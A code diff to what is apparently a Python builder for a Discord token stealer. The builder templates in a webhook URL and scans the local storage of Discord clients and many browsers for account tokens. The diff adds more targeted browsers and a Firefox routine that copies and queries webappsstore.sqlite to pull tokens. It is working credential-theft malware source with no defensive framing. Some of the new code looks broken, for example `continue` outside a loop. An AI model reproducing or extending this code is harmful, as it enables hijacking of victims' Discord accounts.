@@ -17,15 +17,31 @@ LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 WEBHOOK_URL = "''' + WEBHOOK_URL + '''"
 PATHS = {
-    "Discord": ROAMING + "\\\\Discord",
-    "Discord Canary": ROAMING + "\\\\discordcanary",
-    "Discord PTB": ROAMING + "\\\\discordptb",
-    'Discord Development': ROAMING + '\\\\discorddevelopment',
-    'Lightcord': ROAMING + '\\\\lightcord',
-    "Google Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
-    "Opera": ROAMING + "\\\\Opera Software\\\\Opera Stable",
+    "Discord": ROAMING + "\\Discord",
+    "Lightcord": ROAMING + "\\\\Lightcord",
+    "PTB": ROAMING + "\\\\discordptb",
+    "Canary": ROAMING + "\\\\discordcanary",
+    
+    "Firefox": ROAMING + "\\\\Mozilla\\\\Firefox\\\\Profiles",
+
+    "Amigo": LOCAL + "\\\\Amigo\\\\User Data",
+    "Torch": LOCAL + "\\\\Torch\\\\User Data",
+    "Kometa": LOCAL + "\\\\Kometa\\\\User Data",
+    "Orbitum": LOCAL + "\\\\Orbitum\\\\User Data",
+    "CentBrowser": LOCAL + "\\\\CentBrowser\\\\User Data",
+    "7Star": LOCAL + "\\\\7Star\\\\7Star\\\\User Data",
+    "Sputnik": LOCAL + "\\\\Sputnik\\\\Sputnik\\\\User Data",
+    "Vivaldi": LOCAL + "\\\\Vivaldi\\\\User Data\\\\Default",
+    "Chrome SxS": LOCAL + "\\\\Google\\\\Chrome SxS\\\\User Data",
+    "Epic Privacy": LOCAL + "\\\\Epic Privacy Browser\\\\User Data",
+    "Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
+    "Uran": LOCAL + "\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default",
+    "Edge": LOCAL + "\\\\Microsoft\\\\Edge\\\\User Data\\\\Default",
+    "Yandex": LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default",
+    "Opera Neon": LOCAL + "\\\\Opera Software\\\\Opera Neon\\\\User Data\\\\Default",
     "Brave": LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
-    "Yandex": LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
+    "Opera": ROAMING + "\\\\Opera Software\\\\Opera Stable",
+    "Opera GX": ROAMING + "\\\\Opera Software\\\\Opera GX Stable"
 }
 
 
@@ -47,17 +63,48 @@ def getUserData(token):
         pass
 
 
-def getTokens(path):
+def getTokens(path, platform):
     try:
-        path += "\\\\Local Storage\\\\leveldb"
-        tokens = []
-        for file_name in os.listdir(path):
-            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+        if platform == "Firefox":
+            for root, dirs, files in os.walk(path):
+                for dir in dirs:
+                    if not ".default" in dir:
+                        pass
+                    else:
+                        if not os.path.isdir(temp_dir + 'firefoxtoken\\'):
+                            os.mkdir(temp_dir + 'firefoxtoken\\')
+                        try:
+                            copyfile(path + dir + '\\' + 'webappsstore.sqlite',
+                                     temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
+                            connection = sqlite3.connect(temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
+                            cursor = connection.cursor()
+                            cursor.execute('SELECT key, value FROM webappsstore2')
+                            values = cursor.fetchall()
+                            for value in values:
+                                if value[0] == "token":
+                                    token = value[1].replace('"', '')
+                                    try:
+                                        t = b64decode(token[:24])
+                                        int(t.decode())
+                                    except Exception:
+                                        pass
+                                    else:
+                                        tokens.append(token)
+                                else:
+                                    continue
+                        except Exception:
+                            pass
+        else:
+            path += "\\\\Local Storage\\\\leveldb"
+            if not os.path.exists(path):
                 continue
-            for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                for regex in (r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", r"mfa\\.[\\w-]{84}"):
-                    for token in findall(regex, line):
-                        tokens.append(token)
+            for file_name in os.listdir(path):
+                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                    continue
+                for l in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                        for Token in re.findall(regex, l):
+                            tokens.append(Token)
         return tokens
     except:
         pass
@@ -104,7 +151,7 @@ def main():
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
-        for token in getTokens(path):
+        for token in getTokens(path, platform):
             if token in checked:
                 continue
             checked.append(token)
